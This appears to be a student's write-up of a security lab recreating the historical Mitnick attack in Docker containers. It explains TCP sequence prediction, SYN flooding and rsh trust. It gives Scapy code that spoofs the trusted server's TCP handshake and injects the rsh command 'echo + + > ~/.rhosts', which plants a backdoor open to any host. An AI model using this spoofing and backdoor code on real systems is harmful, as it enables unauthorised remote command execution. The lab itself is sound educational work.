# The Mitnick Attack Lab
- the Mitnick attack is a special type of TCP session hijacking
- topics
    - TCP session hijacking
    - TCP three-way handshake protocol
    - Remote shell `rsh`

## How the Mitnick Attack Works
- instead of hijacking existing TCP connection between two victims A and B, the Mitnick attack create a TCP connection between A and B first on their behalf, and then naturally hijacks the connection

- in the actual Mitnick attack, host A was called X-Terminal, which was the target. Mitnick wanted to log into X-Terminal and run his commands on it. Host B was a trusted server, which was allowed to log into X-Terminal without a password. In order to log into X-Terminal, Mitnick had to impersonate the trusted server, so he did not need to provide any password

- here are 4 primary steps in this attack
    1. *Sequence number prediction*: Mitnick needed to learn the pattern of the initial sequence number (ISN) on X-Terminal, in those days, ISNs were not random. Mitnick sent SYN requests to X-Terminal and received SYN+ACK responses, then he sent RST packet to X-Terminal, to clear the half-open connection from X-Terminal's queue. After repeating this for a number of times, he found there was a pattern between 2 successive TCP ISNs, this allowed Mitnick to predict ISNs
    2. *SYN flooding attack on the trusted server*: To send a connection request from the trusted server to X-Terminal, Mitnick needed to send out an SYN packet from the trusted server to X-Terminal. X-Terminal would respond with an SYN+ACK packet, which was sent to the trusted server. Since the trusted server didn't actually initiate the request, it would send a RST packet to X-Terminal, asking X-Terminal to stop the 3-way handshake
        - to solve this problem, Mitnick had to silence the trusted server. Therefore, before spoofing, Mitnick launched an SYN flooding attack on the server. Back then, OS were far more vulnerable to the SYN flooding attack. The attack could actually shut down the trusted computer, completely silencing it
    3. *Spoofing a TCP connection*: Mitnick wanted to use `rsh` to run a backdoor command on X-Terminal, once the backdoor was setup, he could then log into X-Terminal. To run a remote shell on X-Terminal, Mitnick needed to pass the authentication, i.e., he needed to have a valid account on X-Terminal and know its password. The IP address of the trusted server had been added to the `.rhosts` file on X-Terminal, so when logging into X-Terminal from the trusted server, no password would be asked. Mitnick wanted to exploit this trusted relationship
        - He needed to create a TCP connection between the trusted server and XT, and then run `rsh` inside this connection. He first sent an SYN request to XT, using the trusted server's IP as the source IP. XT then sent an SYN+ACK response to the server. Since the server had been shut down, it would not send RST to close the connection
        - To complete the 3-way handshake, Mitnick needed to spoof an ACK packet, which must acknowledge the sequence number in XT's SYN+ACK packet. Because of previous investigation, Mitnick was able to predict what this sequence number was, so he was able to successfully spoof the ACK response sent to XT to complete the TCP 3-way handshake
    4. *Running a remote shell*: Using the established TCP connection between the trusted server and XT, Mitnick could send a remote shell request to XT, asking it to run a command. Using this command, Mitnick wanted to create a backdoor on XT so that he could get a shell on XT anytime without repeating the attack
        - All he needed to do was to add `+ +` (plus, space, plus) to the `.rhosts` file on XT (this will allow machines with any IP addresses to run a remote shell on XT). He could achieve that by executing `echo + + > .rhosts`

## Lab Setup
- network `10.9.0.0/24`
    - attacker `10.9.0.1`
    - X-Terminal `10.9.0.5`
    - trusted Server `10.9.0.6`

- installing `rsh` (no action is needed)
    - the remote shell `rsh` is a command line program that can execute shell commands remotely
    - we should know that `rsh` and `rlogin` programs are not secure, and they are not used any more, in the modern Linux OS, the `rsh` command is actually a symbolic link to the `ssh` program
    - to recreate the Mitnick attack, we need to install the unsecure version of the `rsh` program. Obviously, the old version of `rsh` no longer works, but an open-source project re-implements the remote shell clients and servers. It is called `rsh-redone`. we can install the `rsh` client and server using the following commands `sudo apt-get install rsh-redone-client` and `sudo apt-get install rsh-redone-server`
    - no action needed, as the `rsh` programs are already installed in the X-Terminal and trusted server containers, see the `Dockerfile`

- configuration: the `rsh` server program uses two files for authentication, `.rhost` and `/etc/hosts.equiv`, every time the server receives a remote command request, it will check the `/etc/hosts.equiv`. If the request comes from a hostname stored in the file, the server will accept it without asking for passwords. If `/etc/hosts.equiv` doesn't exist or do not have that hostname, `rsh` will check the `.rhosts` file on the user's home directory
- create a `.rhosts` file on host X-Terminal, and put the trusted server's IP address into the file, `.rhosts` must reside at the top level of a user's home directory and can be written only by the owner/user. In this lab, we switch to a normal user `seed` on X-Terminal
    ```
    # su seed <--- switch to the seed account
    $ cd ~
    $ touch .rhosts
    $ echo 10.9.0.6 > .rhosts
    $ chmod 644 .rhosts <--- important, make it only writable to seed
    ```
- verify the configuration on the **trusted server**
    ```
    # su seed <--- also need to switch to the seed account
    $ rsh 10.9.0.5 date
    Sat Feb 10 14:41:14 UTC 2024
    ```
- *allow all*: to allow users from all IP addresses to execute commands on X-Terminal, we just need to put two plus signs with a space between them (`+ +`) in the `.rhosts`, normally, nobody should do this, but attacker can use this to set up a backdoor

## Task 1: Simulated SYN flooding
- the OS at the time of Mitnick Attack were vulnerable to SYN flooding attacks, which could mute the target machine or even shut it down. However, SYN flooding can no longer cause such a damage for modern OSes
- simulate this effect by manually stop the trusted server container, but that is not enough. When XT receives an SYN packet from the trusted server, it will respond with an SYN+ACK packet, before sending out this packet, it needs to know the MAC address of the trusted server, it will first check the ARP cache, if there is no entry for the trusted server, it will broadcast an ARP request asking for the MAC address. Since the trusted server has been muted, no one is going to answer the ARP request, hence X-Terminal cannot send out the response, and the TCP connection will not be established
- in the real attack, the trusted server's MAC address was actually in XT's ARP cache, even if it was not, before silencing the trusted server, we could simply spoof an ICMP echo request from the trusted server to XT, that would trigger XT to reply to the server, and hence would get the server's MAC and save it to its cache
- to simplify the task, before stopping the trusted server, we will simply ping it from XT once, and use `arp -n` to check and ensure that the MAC address is in the cache, however, the OS may delete it if the OS fail to reach a destination using the cached MAC address. To simplify the attack, we can use `arp -s 10.9.0.6 02:42:0a:09:00:06` to add an entry to XT's ARP cache permanently
    ```
    # arp -s 10.9.0.6 02:42:0a:09:00:06
    # su seed
    $ arp -n
    Address      HWtype  HWaddress           Flags Mask     Iface
    10.9.0.6     ether   02:42:0a:09:00:06   CM             eth0
    ```
- stop the trusted server container: `docker stop 4f`
## Task 2: Spoof TCP Connections and `rsh` Sessions
- impersonate the trusted server, and try to launch a `rsh` session with XT
- one of the difficuties is to predict the TCP sequence number, it was possible back then, but modern OS randomize their TCP sequence numbers (as a countermeasure against TCP session hijacking attacks), so predicting the number is infeasible. To simulate the situation of the original Mitnick attack, sniff the packets to get the sequence number
- *restriction*: to simulate the original Mitnick attack as closely as we can, even though we can sniff packets from XT, we cannot use all the fields. Only use the following fields of the captured packets
    1. the TCP sequence number: do **NOT** include the ACK
    2. the TCP flag field: this allows us to know the types of the captured TCP packets
    3. all the length fields: including IP header length, IP total length, and TCP header length. These fields are not necessary for the attack, but in the actual Mitnick attack, Mitnick knew exactly what their values are
- *the behavior of `rsh`*: to create a spoofed `rsh` session between the trusted server and XT, we need to understand the behavior of `rsh`. Start a `rsh` session from the trusted server to XT, by inspecting the packets between XT and trusted server, we can observe that a `rsh` session consists of 2 TCP connections:
    - The first is initiated by the trust server. An `rshd` process on XT is listening to the connection request at port `514`. After the first connection has been established, the trusted server send `rsh` data (user IDs and commands) to XT. The `rshd` process will authenticate the user, and if the user is authenticated, `rshd` initiates a separate TCP connection with the trusted server
    - The second connection is used for sending error messages, if there was no error, there will not be any data transmitted after the connection is established
    - After the second connection has been established, XT will send a zero byte (`0x00`) to the trusted server using the first connection, and the trusted server will acknowledge the packet. After than, `rshd` on XT will run the command sent by the trusted server, and the output of the command will be sent back to the client, via the first connection

### Task 2.1: Spoof the First TCP Connection
- The first TCP connection is initiated by the attacker via a spoofed SYN packet
- *step 1*: spoof an SYN packet
    ```
    ip  = IP(src=TS_IP, dst=XT_IP)
    tcp = TCP(flags="S", seq=ISN, sport=TS_PORT, dport=XT_PORT)
    send(ip/tcp)
    ```
- *step 2*: respond to the SYN+ACK packet
    ```
    # Spoofing the ACK packet
    SEQ = ISN + 1
    ACK = pkt[TCP].seq + 1
    ip  = IP(src=TS_IP, dst=XT_IP)
    tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
    send(ip/tcp)
    print('[Connection 1] Spoofed ACK sent\n')
    print('[Connection 1] Connection 1 established\n')
    ```
- *step 3*: spoof the `rsh` data packet
    ```
    ip  = IP(src=TS_IP, dst=XT_IP)
    tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
    data = '9090\x00seed\x00seed\x00echo + + > ~/.rhosts\x00'
    rsh_data_len = len(data)
    # The next sequence number via this connection is (SEQ + rsh_dat_len)
    send(ip/tcp/data)
    print('[Connection 1] Spoofed rsh data sent\n')
    ```
    - the format of `rsh` data is `[port]\x00[uid_client]\x00[uid_server]\x00[command]\x00`

### Task 2.2: Spoof the Second TCP Connection
- XT will send an SYN, we need to spoof an SYN+ACK packet, and XT will send back an ACK packet to finish the 3-way handshake, we don't need to do anything to this ACK packet

- After the second connection is established, XT will send an ACK with zero byte via the first connection, and XT will execute our command only if we respond an ACK, so we need to spoof an ACK, with the correct sequence number. Although we are not allowed to use the ACK number of sniffed packets, we can calculate the next sequence number, remember that the last spoofed packet is the `rsh` data packet, and it's sequence number is `ISN+1`, and we know the data length, so the next sequence number is `ISN+1+rsh_data_len`

## Task 3: Set Up a Backdoor
- `rsh` data: `9090\x00seed\x00seed\x00echo + + > ~/.rhosts\x00`
- I put the entire attack process into one Python file `mitnick_auto.py`, such that by running it, the attack will be launched automatically
- result (on the attacker container)
    ```
    # ./mitnick_auto.py
    ... <---- some information printed out
    # su seed
    $ rsh 10.9.0.5 date <---- test the backdoor
    Sun Feb 11 07:53:46 UTC 2024 <---- successfully run command on XT
    ```
